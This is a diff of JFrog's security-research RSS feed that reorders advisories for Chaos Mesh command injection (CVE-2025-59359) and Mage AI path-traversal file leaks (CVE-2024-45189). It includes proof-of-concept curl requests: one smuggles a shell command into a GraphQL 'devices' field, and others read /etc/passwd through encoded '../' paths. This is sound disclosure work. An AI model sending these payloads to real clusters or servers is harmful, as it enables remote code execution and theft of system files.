@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Thu, 20 Aug 2026 17:07:36 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 20 Aug 2026 17:14:09 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -1436,6 +1436,61 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+OS command injection in Chaos Mesh via the cleanTcs mutation
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+
+## PoC
+
+```shell
+curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
+    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
+    "variables": {
+      "namespace": "kube-system",
+      "podName": "coredns-5dd5756b68-779rm",
+      "devices": ["eth0 root; touch /tmp/foo; "]
+    }
+  }'
+
+```
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Chaos Mesh cleanIptables command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</guid>
@@ -1593,61 +1648,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 [JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
 
 
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the cleanTcs mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-## PoC
-
-```shell
-curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
-    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
-    "variables": {
-      "namespace": "kube-system",
-      "podName": "coredns-5dd5756b68-779rm",
-      "devices": ["eth0 root; touch /tmp/foo; "]
-    }
-  }'
-
-```
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
 
 ]]></content:encoded>
         </item>
@@ -3222,6 +3222,49 @@ No references are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI git content request remote arbitrary file leak
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
+
+## PoC
+
+```bash
+curl -X GET
+'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
+<USER TOKEN>'
+```
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
@@ -3250,49 +3293,6 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 curl -X GET
 'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
 <USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI git content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
